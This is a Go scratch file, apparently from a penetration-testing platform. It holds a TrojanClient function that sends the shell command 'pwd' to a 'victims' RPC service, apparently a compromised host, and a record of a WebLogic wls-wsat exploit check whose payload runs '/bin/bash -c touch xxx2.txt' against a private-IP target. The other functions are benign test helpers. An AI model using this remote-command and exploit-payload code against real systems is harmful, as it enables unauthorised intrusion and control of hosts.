package main

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"time"

	"github.com/jstang9527/buoy/micro/proto/model"
	"github.com/jstang9527/buoy/micro/proto/rpcapi"
	"github.com/micro/go-micro"
	"github.com/micro/go-micro/registry"
	"github.com/micro/go-plugins/registry/consul"
)

// TrojanClient 远程客户端交互
func TrojanClient() {
	reg := consul.NewRegistry(registry.Addrs("172.31.50.178:8500"))
	service := micro.NewService(micro.Name("victims.dtboCI"), micro.Registry(reg))
	service.Init()
	controller := rpcapi.NewVictimService("victims.dtboCI", service.Client())
	rsp, err := controller.Communication(context.Background(), &model.Request{Cmd: "pwd"})
	if err != nil {
		panic(err)
	}
	fmt.Println(rsp)
}

func reMethod() {
	// 5fb8e 3dc11 109ff b5e8c dc3e
	// 5fb78 266db 210b4 6b329 77cb
	text := "5fb8e3dc11109ffb5e8cdc3e.weblogic.172.31.50.178:6379.62"
	assetRe, _ := regexp.Compile("^\\w{24}")
	// re, _ := regexp.Compile("(\\d{1,3}\\.){3}\\d{1,3}:\\d{2,5}")
	fmt.Println(string(assetRe.Find([]byte(text))))
}

// TimeOutMethod ...
func TimeOutMethod(ctx context.Context) {
	for i := 0; i < 20; i++ {
		select {
		case <-ctx.Done(): // 10秒后执行
			fmt.Println("ctx over")
			return // beak是没有用的
		default:
			fmt.Printf("exec method-(%v)\n", i)
			time.Sleep(time.Second)
		}

	}
}

// TimeOutMethodTest ...
func TimeOutMethodTest() {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()
	TimeOutMethod(ctx)
	fmt.Println("finished.")
}

func mapTest() {
	val := make(map[string]string, 10)
	val["aa"] = "aaaa"
	fmt.Printf("%#v", val["aaa"])
}

// Info ...
type Info struct {
	VerifyInfo   map[string]string `json:"VerifyInfo"`
	ExploitInfo  map[string]string `json:"ExploitInfo"`
	WebshellInfo map[string]string `json:"WebshellInfo"`
	TrojanInfo   map[string]string `json:"TrojanInfo"`
}

/*
{
	"VerifyInfo":{
		"PostData":"\u003cstring\u003e/bin/bash\u003c/string\u003e\n \u003cstring\u003e-c\u003c/string\u003e\n \u003cstring\u003etouch xxx2.txt\u003c/string\u003e",
		"Result":"Find Keyinfo In Response Data, Info: \u003cfaultcode\u003eS:Server\u003c/faultcode\u003e\u003cfaultstring\u003e0\u003c/faultstring\u003e",
		"URL":"http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl"
	}
}
*/

func jsonp() {
	value := make(map[string]string, 3)
	value["URL"] = "http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl"
	value["PostData"] = "<string>/bin/bash</string>\n <string>-c</string>\n <string>touch xxx2.txt</string>"
	value["Result"] = "Find Keyinfo In Response Data, Info: <faultcode>S:Server</faultcode><faultstring>0</faultstring>"

	info := &Info{
		VerifyInfo:   value,
		ExploitInfo:  value,
		WebshellInfo: value,
		TrojanInfo:   value,
	}

	data, err := json.Marshal(info)
	if err != nil {
		fmt.Println("json marshal failed!")
		return
	}
	fmt.Printf("%s", data)
}

func main() {
	jsonp()
	// reMethod()
	// TimeOutMethodTest()
	// mapTest()
}
